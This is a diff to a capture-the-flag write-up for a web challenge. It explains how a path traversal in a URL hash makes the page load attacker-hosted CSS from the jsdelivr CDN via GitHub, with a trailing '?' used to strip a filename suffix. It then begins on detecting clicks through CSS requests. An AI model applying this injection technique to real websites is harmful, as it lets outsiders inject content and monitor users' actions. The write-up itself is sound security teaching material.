@@ -10,12 +10,16 @@ We can exploit this by inserting on the URL our custom hash, pointing to our mal
 ```
 https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/xxxxxxx-mode.css
 ```
-By visiting `http://web.chall.bi0s.in:10101/#../../gh/GramThanos/github_repo_here@github_commit_here/malicious.css?` the CSS that the page will load will be (notice the path traversal):
+By visiting `http://web.chall.bi0s.in:10101/#../../gh/GramThanos/github_repo_here@github_commit_here/malicious.css?` the CSS that the page will load will be:
 ```
 https://cdn.jsdelivr.net/gh/GramThanos/github_repo_here@github_commit_here/malicious.css?-mode.css
 ```
 
-Note: The jsdelivr CDN apart from access to NPM modules also can give access to GitHub projects. Thus we can deliver our code through GitHub. Note that since jsdelivr is caching our files, it is best to point to specific commits when we deliver payloads.
+Note 1: The jsdelivr CDN apart from access to NPM modules also can give access to GitHub projects. Thus we can deliver our code through GitHub. Note that since jsdelivr is caching our files, it is best to point to specific commits when we deliver payloads.
+
+Note 2: Notice that we used the a path traversal here to change to a different project.
+
+Note 3: Notice that we used a `?` at the end of the provided hash value so that the URL filename does not include the `-mode.css` part. Alternatively we could have renamed our payload file to `malicious-mode.css` to bypass this limitation.
 
 Since the code is in CSS, we will have to detect the user actions (click) using CSS. This is done by creating a request on each action and monitoring the requests. Normaly to do that you add background image requests on actions such as "hover", "focus", "active", but here since the client is a bot, such mouse events where not working.
 
